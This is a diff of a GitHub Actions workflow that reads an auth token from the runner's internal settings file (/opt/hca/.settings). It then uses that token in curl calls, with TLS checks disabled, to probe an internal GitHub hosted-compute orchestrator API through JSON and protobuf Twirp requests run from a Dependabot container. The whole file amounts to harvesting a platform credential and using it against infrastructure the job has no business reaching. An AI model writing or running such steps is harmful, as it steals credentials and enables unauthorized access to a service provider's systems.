@@ -1,4 +1,4 @@
-name: Final Go Client
+name: JSON vs Protobuf
 on:
   push:
     branches: [master]
@@ -9,13 +9,42 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Run Twirp client with verbose error
-        continue-on-error: true
+      - name: Test both formats
         run: |
-          ./hca-client 2>&1
-          echo "---"
-          # Also test via curl with more detail
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          curl -sv --connect-timeout 10 \
-            -H "Authorization: Bearer $TOK" \
-            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/" 2>&1 | tail -20
+          API="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          
+          echo "=== /v1/ with JSON ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
+            curl -sk --connect-timeout 5 \
+              -H 'Authorization: Bearer $TOK' \
+              -H 'Content-Type: application/json' \
+              -H 'Accept: application/json' \
+              '$API/v1/'
+          " 2>&1
+          
+          echo ""
+          echo "=== /v1/twirp/... with JSON ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
+            curl -sk --http2 --connect-timeout 5 \
+              -H 'Authorization: Bearer $TOK' \
+              -H 'Content-Type: application/json' \
+              -H 'Accept: application/json' \
+              -d '{\"planId\":\"test\"}' \
+              '$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
+          " 2>&1
+          
+          echo ""
+          echo "=== /v1/twirp/... with Protobuf ==="
+          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "
+            curl -sk --http2 --connect-timeout 5 \
+              -H 'Authorization: Bearer $TOK' \
+              -H 'Content-Type: application/protobuf' \
+              -H 'Accept: application/protobuf' \
+              --data-binary $'\\n' \
+              '$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'
+          " 2>&1
+          
+          echo ""
+          echo "=== Run ./hca-client ==="
+          ./hca-client 2>&1
